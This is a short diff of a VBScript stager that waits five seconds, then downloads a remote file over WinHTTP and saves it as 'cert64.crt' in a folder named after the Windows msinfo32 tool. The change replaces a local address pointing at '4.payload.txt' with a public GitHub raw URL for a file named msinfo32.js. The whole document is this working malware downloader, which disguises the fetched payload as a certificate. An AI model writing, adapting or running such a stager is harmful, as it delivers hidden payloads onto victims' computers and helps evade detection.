@@ -1,6 +1,6 @@
 WScript.Sleep(5000)
 Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
-URL = "http://192.168.115.128/4.payload.txt"
+URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/msinfo32.js"
 objWinHttp.open "GET", URL, False
 objWinHttp.send ""
 SaveBinaryData "C:\ProgramData\msinfo32\cert64.crt",objWinHttp.responseBody
